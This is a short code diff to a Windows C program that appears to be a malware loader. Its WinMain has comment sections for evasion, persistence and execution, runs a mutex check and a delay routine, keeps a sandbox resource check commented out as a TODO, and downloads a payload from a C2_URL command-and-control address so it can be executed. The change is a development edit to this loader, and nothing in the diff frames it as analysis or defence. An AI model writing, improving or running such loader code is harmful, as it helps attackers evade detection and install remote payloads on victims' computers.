@@ -9,18 +9,14 @@
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
     
     // 1. EVASION
-/*
-TODO: FIX RESOURCE CHECK
-    if (!check_resources()) {
-        return 0;
-    }
-*/  
+
+    if (!check_mutex()) return 0;
+
+
+    // TODO: FIX RESOURCE CHECK
+    // if (!check_resources()) return 0;
 
     smart_delay();
-
-    if (!check_mutex()) {
-        return 0;
-    }
 
     // 2. PERSISTENCE
 
@@ -35,9 +31,7 @@ TODO: FIX RESOURCE CHECK
     
     char* payload = download_payload(C2_URL, &payload_size);
 
-    if (payload == NULL) {
-        return 0;
-    }
+    if (payload == NULL) return 0;
 
     // 4. EXECUTE
 
